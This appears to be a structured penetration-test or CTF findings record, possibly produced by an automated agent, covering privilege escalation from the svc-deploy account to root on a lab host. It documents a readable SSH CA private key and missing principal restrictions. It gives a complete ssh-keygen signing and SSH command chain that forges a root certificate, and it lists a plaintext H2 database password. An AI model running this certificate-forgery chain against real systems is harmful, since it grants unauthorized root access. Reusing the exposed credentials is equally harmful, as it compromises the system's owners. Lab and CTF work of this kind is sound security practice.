objective.statement: Enumerate privilege escalation vectors from svc-deploy to root. Focus on SSH CA cert signing, deployers group permissions, and deployment infrastructure.
objective.completion_notes: All enumeration vectors checked. Critical privesc lead identified: SSH CA cert forgery to root.

high_value_findings.title: SSH CA private key readable by svc-deploy
high_value_findings.summary: CA private key at /opt/principal/ssh/ca (RSA 4096, unencrypted) is rw-r----- root:deployers. svc-deploy is in deployers group and can read it. This CA is trusted by sshd via TrustedUserCAKeys.

high_value_findings.title: No AuthorizedPrincipalsFile — cert principal=root grants root login
high_value_findings.summary: sshd trusts the CA but does not restrict certificate principals via AuthorizedPrincipalsFile. Any cert signed by the CA with principal matching the login username is accepted. Combined with PermitRootLogin prohibit-password, a cert with principal root grants root SSH access.
high_value_findings.evidence: TrustedUserCAKeys /opt/principal/ssh/ca.pub in 60-principal.conf. AuthorizedPrincipalsFile not configured. PermitRootLogin prohibit-password.

privesc_leads.path: SSH CA cert forgery to root
privesc_leads.evidence: CA privkey readable (/opt/principal/ssh/ca, root:deployers rw-r-----). sshd trusts CA (TrustedUserCAKeys). No AuthorizedPrincipalsFile. PermitRootLogin prohibit-password. Sign a key with principal=root, SSH as root.
principal / Pr1nc1p@l_Db_2025! in application.properties. Data dir /opt/principal/app/data/ owned by app user, inaccessible. H2 console disabled.

credentials_and_secrets.notes: RSA 4096, unencrypted, readable by deployers group. Trusted by sshd for cert-based auth.
H2 DB: principal / Pr1nc1p@l_Db_2025! (jdbc:h2:file:/opt/principal/app/data/principal). Data dir not accessible to svc-deploy. Console disabled.

misconfigurations.summary: SSH CA private key readable by deployers group
misconfigurations.evidence: -rw-r----- root:deployers /opt/principal/ssh/ca — svc-deploy (deployers member) can read the signing key
AuthorizedPrincipalsFile not configured — any cert signed by trusted CA with principal matching login username is accepted

anomalies.description: /opt/principal/deploy/ exists (root:root rwxr-x---) but inaccessible to svc-deploy despite being a deployment service account
anomalies.impact: May contain deploy.sh referenced in README.txt — could be additional privesc vector if accessible via another path

oracle_flags.action: Forge SSH certificate for root using CA key
oracle_flags.rationale: Trivial exploitation: generate keypair, sign with readable CA key (principal=root), SSH as root. No restrictions on cert principals. Command sequence: ssh-keygen -t ed25519 -f /tmp/pwn -N '' && ssh-keygen -s /opt/principal/ssh/ca -I root-cert -n root -V +1h /tmp/pwn.pub && ssh -i /tmp/pwn -o CertificateFile=/tmp/pwn-cert.pub root@10.129.244.220
Credential found but data dir inaccessible to svc-deploy. Only relevant if app user access is obtained or alternative H2 interface discovered.

evidence_refs: memoria finding #5: SSH CA private key readable by svc-deploy
memoria credential #2: SSH CA key at /opt/principal/ssh/ca
memoria credential #3: H2 DB principal / Pr1nc1p@l_Db_2025!
